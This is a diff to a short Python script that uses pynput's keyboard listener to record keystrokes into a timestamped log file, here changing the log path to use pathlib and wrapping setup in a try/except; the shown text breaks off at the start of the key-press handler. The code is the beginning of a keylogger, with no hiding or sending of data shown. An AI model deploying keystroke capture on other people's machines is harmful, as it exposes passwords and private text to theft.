@@ -1,14 +1,18 @@
 from pynput.keyboard import Key, Listener
 import logging
 from datetime import datetime
+from pathlib import Path
 
 is_logging = True
-log_dir = "logs/"
 current_time = datetime.now().strftime("%Y%m%d-%H%M%S")
-log_name = log_dir+current_time + " KEYS.txt"
+log_dir = Path("logs/" + current_time + " LOG.txt")
 
-logging.basicConfig(filename=(log_name), level=logging.DEBUG, format='%(asctime)s: %(message)s')
-print("Logging started")
+print(log_dir)
+try:
+    logging.basicConfig(filename=(log_dir), level=logging.DEBUG, format='%(asctime)s: %(message)s')
+    print("Logging started")
+except: 
+    print("Error found")
 
 def on_press(key):
     global is_logging
